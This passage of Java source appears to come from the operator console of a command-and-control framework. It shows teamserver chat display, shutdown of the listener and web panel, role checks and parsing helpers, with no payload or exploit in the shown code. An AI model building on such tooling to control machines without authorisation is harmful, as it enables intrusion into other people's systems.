        if (Msgs.isEmpty()) {
            Logger.Info("  no chat history");
            System.out.println();
            return;
        }
        for (Map<String, Object> M : Msgs) {
            String From = M.getOrDefault("from_operator", "?").toString();
            String To = M.getOrDefault("to_operators", "all").toString();
            String Ts = M.getOrDefault("timestamp", "").toString();
            if (Ts.length() > 19) Ts = Ts.substring(11, 19);
            boolean Mine = From.equals(OperatorName);
            Logger.Custom("  %s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("message", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void Shutdown() {
        if (WebPanelManager.IsRunning()) WebPanelManager.Stop();
        if (IsTeamMode && SharedServer != null && SharedServer == Server) {
            Logger.Info("teamserver session ended — listener remains active");
        } else if (Server != null && Server.IsRunning()) {
            Server.StopServer();
        }
        Db.Close();
        Logger.Shutdown();
        System.exit(0);
    }

    private boolean CanExecute() {
        return !IsTeamMode || (OperatorRole != null && OperatorRole.CanExecute());
    }

    private boolean CanManage() {
        return !IsTeamMode || (OperatorRole != null && OperatorRole.CanManage());
    }

    private String Usage(String Cmd) {
        CommandDef D = CommandRegistry.Get(Cmd);
        return D != null ? "usage: " + D.Usage() : "usage: " + Cmd;
    }

    private static int ParseInt(String S) {
        return Integer.parseInt(S.trim());
    }

    private static int ParseIntSafe(String S, int D) {
        try {
            return Integer.parseInt(S.trim());
        } catch (Exception Ex) {
            return D;
        }
    }

    private static String BuildArgs(String[] Parts, int StartIndex) {
        if (Parts.length <= StartIndex) return "";
        StringBuilder Builder = new StringBuilder();
        for (int Index = StartIndex; Index < Parts.length; Index++) {
            if (Index > StartIndex) Builder.append(' ');
            Builder.append(Parts[Index]);
        }
        return Builder.toString();
    }

    private static List<Integer> ParseIds(String S) {
        List<Integer> Ids = new ArrayList<>();
        for (String Part : S.split(","))
            try {
                Ids.add(Integer.parseInt(Part.trim()));
            } catch (Exception Ignored) {}
        return Ids;
    }

    private static boolean IsPortBound(String Host, int Port) {
        try (ServerSocket T = new ServerSocket()) {
            T.setReuseAddress(false);
            T.bind(new InetSocketAddress(Port));
            return false;
        } catch (IOException Ex) {
            return true;
        }
    }
}
